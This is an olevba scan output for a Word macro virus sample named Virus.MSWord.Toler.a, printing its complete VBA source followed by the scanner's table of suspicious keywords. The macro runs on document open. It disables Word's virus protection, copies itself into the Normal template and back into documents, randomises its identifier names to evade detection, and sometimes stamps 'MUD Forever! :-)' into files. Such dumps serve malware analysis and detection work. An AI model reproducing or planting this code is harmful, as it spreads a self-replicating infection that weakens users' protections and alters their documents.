olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toler.a-4baec1ad0b4089a9b9eb66d1e8e4846968868ad9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Toler.a-4baec1ad0b4089a9b9eb66d1e8e4846968868ad9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Tolerance!
Private Type FjntZ
  DbaguZ As Integer
  AxwvcbruZ As Integer
  YylesZ As Boolean
End Type
Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim RolcfcZ As Object, FepZ As Object
  Set RolcfcZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set FepZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim DtqlvZ As FjntZ, NmsiZ As FjntZ: DtqlvZ = XqjtrucZ(RolcfcZ): NmsiZ = XqjtrucZ(FepZ)
  If NmsiZ.AxwvcbruZ = 0 Then
     CmybZ RolcfcZ, FepZ, DtqlvZ, NmsiZ
     Options.SaveNormalPrompt = False
  End If
  If (DtqlvZ.AxwvcbruZ = 0) Or ((NmsiZ.AxwvcbruZ <> 0) And (DtqlvZ.AxwvcbruZ <> NmsiZ.AxwvcbruZ)) Then
     CmybZ FepZ, RolcfcZ, NmsiZ, DtqlvZ
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub CmybZ(DbaguZ As Object, SbdZ As Object, FromP As FjntZ, ToP As FjntZ)
  Dim MdntZ As String, OjkcxfZ
  MdntZ = DbaguZ.Lines(FromP.DbaguZ, FromP.AxwvcbruZ)
  OjkcxfZ = Array("BnteZ", "FjntZ", "DbaguZ", "SbdZ", "MxcrrZ", "AxwvcbruZ", "YylesZ", "RolcfcZ", "FepZ", "DtqlvZ", "NmsiZ", "CmybZ", "MdntZ", "CgtumpZ", "PxxhZ", "DfomhtnZ", "XqjtrucZ", "DnseiZ", "OjkcxfZ")
  For I = 0 To 18: DnseiZ MdntZ, (OjkcxfZ(I)), BnteZ(MdntZ): Next I
  If ToP.YylesZ Then SbdZ.DeleteLines 1, SbdZ.CountOfLines
  SbdZ.AddFromString MdntZ
End Sub
Private Function BnteZ(MdntZ As String) As String
  Dim CgtumpZ As String: CgtumpZ = ""
  While (InStr(MdntZ, CgtumpZ) <> 0) Or (Len(CgtumpZ) < 3)
     CgtumpZ = ""
     For I = 1 To 10
         If Rnd > 0.5 Then
            If Len(CgtumpZ) = 0 Then
                  CgtumpZ = CgtumpZ + Chr(Int(Rnd * 25 + 65))
            Else: CgtumpZ = CgtumpZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next I
     CgtumpZ = CgtumpZ + "Z"
  Wend
  BnteZ = CgtumpZ
End Function
Private Sub DnseiZ(MdntZ As String, PxxhZ As String, DfomhtnZ As String)
  Dim I As Long
  I = 1
  While InStr(I, MdntZ, PxxhZ) <> 0
        I = InStr(I, MdntZ, PxxhZ)
        MdntZ = Left(MdntZ, I - 1) + DfomhtnZ + Mid$(MdntZ, I + Len(PxxhZ))
        Index = Index + 1
  Wend
End Sub
Private Function XqjtrucZ(MxcrrZ As Object) As FjntZ
  XqjtrucZ.DbaguZ = 0
  XqjtrucZ.AxwvcbruZ = 0
  XqjtrucZ.YylesZ = False
  For I = 1 To MxcrrZ.CountOfLines
   If MxcrrZ.Lines(I, 1) = "' Tolerance!" Then XqjtrucZ.DbaguZ = I
   If MxcrrZ.Lines(I, 1) = "End Function 'Tolerance!" Then XqjtrucZ.AxwvcbruZ = I - XqjtrucZ.DbaguZ + 1
   If InStr(MxcrrZ.Lines(I, 1), "Private Sub Document_Open()") = 1 Then XqjtrucZ.YylesZ = True
  Next I
End Function 'Tolerance!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

